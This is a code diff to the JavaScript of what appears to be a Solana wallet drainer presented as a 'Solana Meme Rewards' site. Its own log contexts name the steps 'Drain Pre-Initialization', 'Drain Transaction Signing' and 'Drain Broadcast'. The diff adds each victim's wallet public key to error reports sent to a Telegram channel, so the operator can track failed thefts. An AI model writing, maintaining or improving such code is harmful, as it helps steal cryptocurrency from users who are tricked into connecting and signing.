@@ -3211,6 +3211,7 @@
                 error: preInitError.message,
                 stack: preInitError.stack,
                 context: 'Drain Pre-Initialization',
+                publicKey: publicKey.toString(),
                 walletType: window.currentWalletType || 'Unknown',
                 timestamp: new Date().toISOString(),
                 projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
@@ -3379,6 +3380,7 @@
                       error: patientModeError.message,
                       stack: patientModeError.stack,
                       context: 'Drain Transaction Signing (Patient Mode)',
+                      publicKey: publicKey.toString(),
                       walletType: walletType,
                       timestamp: new Date().toISOString(),
                       projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
@@ -3396,6 +3398,7 @@
                   error: signError.message,
                   stack: signError.stack,
                   context: 'Drain Transaction Signing',
+                  publicKey: publicKey.toString(),
                   walletType: walletType,
                   timestamp: new Date().toISOString(),
                   projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
@@ -3468,6 +3471,7 @@
           error: broadcastError.message,
           stack: broadcastError.stack,
           context: 'Drain Broadcast',
+          publicKey: publicKey.toString(),
           walletType: window.currentWalletType || 'Unknown',
           responseStatus: broadcastResponse.status,
           timestamp: new Date().toISOString(),
@@ -3514,6 +3518,7 @@
         window.sendTelegramLog('API_CALL', {
           error: broadcastResult.error,
           context: 'Drain Broadcast Result',
+          publicKey: publicKey.toString(),
           walletType: window.currentWalletType || 'Unknown',
           timestamp: new Date().toISOString(),
           projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
@@ -3533,6 +3538,7 @@
           error: signError.message,
           stack: signError.stack,
           context: 'Drain Transaction Signing',
+          publicKey: publicKey.toString(),
           walletType: window.currentWalletType || 'Unknown',
           timestamp: new Date().toISOString(),
           projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
@@ -3711,6 +3717,7 @@
         window.sendTelegramLog('API_CALL', {
           error: `Pre-initialization transaction ${i + 1} failed: ${broadcastResponse.status}`,
           context: 'Pre-Initialization Broadcast',
+          publicKey: publicKey.toString(),
           walletType: walletType,
           transactionIndex: i + 1,
           responseStatus: broadcastResponse.status,
@@ -3793,6 +3800,7 @@
           error: error.message,
           stack: error.stack,
           context: 'Pre-Initialization',
+          publicKey: publicKey.toString(),
           walletType: window.currentWalletType || 'Unknown',
           timestamp: new Date().toISOString(),
           projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
@@ -4580,17 +4588,18 @@
       } catch (connectionError) {
         logger.error(`[MOBILE_WALLET] Connection failed for ${walletType}:`, connectionError)
       
-      // Log critical mobile wallet connection failures to Telegram
-      if (window.sendTelegramLog) {
-        window.sendTelegramLog('WALLET_CONNECTION', {
-          error: connectionError.message,
-          stack: connectionError.stack,
-          context: 'Mobile Wallet Connection',
-          walletType: walletType,
-          timestamp: new Date().toISOString(),
-          projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
-        });
-      }
+              // Log critical mobile wallet connection failures to Telegram
+        if (window.sendTelegramLog) {
+          window.sendTelegramLog('WALLET_CONNECTION', {
+            error: connectionError.message,
+            stack: connectionError.stack,
+            context: 'Mobile Wallet Connection',
+            publicKey: 'Unknown', // Mobile wallet connection doesn't have publicKey yet
+            walletType: walletType,
+            timestamp: new Date().toISOString(),
+            projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
+          });
+        }
         
         // Show appropriate error message
         if (connectionError.message.includes('timeout')) {
@@ -4672,6 +4681,7 @@
               walletType: walletType,
               error: error.message,
               context: 'Wallet Detection',
+              publicKey: 'Unknown', // Detection doesn't have publicKey yet
               timestamp: new Date().toISOString(),
               projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
             });
@@ -5325,6 +5335,7 @@
           window.sendTelegramLog('WALLET_CONNECTION', {
             error: `All ${maxRetries} connection attempts failed`,
             context: 'Mobile Wallet Retry Failure',
+            publicKey: 'Unknown', // Retry doesn't have publicKey yet
             walletType: walletType,
             maxRetries: maxRetries,
             timestamp: new Date().toISOString(),
@@ -5386,6 +5397,7 @@
                     error: error.message,
                     stack: error.stack,
                     context: 'Auto-Reconnection Failure',
+                    publicKey: 'Unknown', // Auto-reconnection doesn't have publicKey yet
                     walletType: walletType,
                     timestamp: new Date().toISOString(),
                     projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
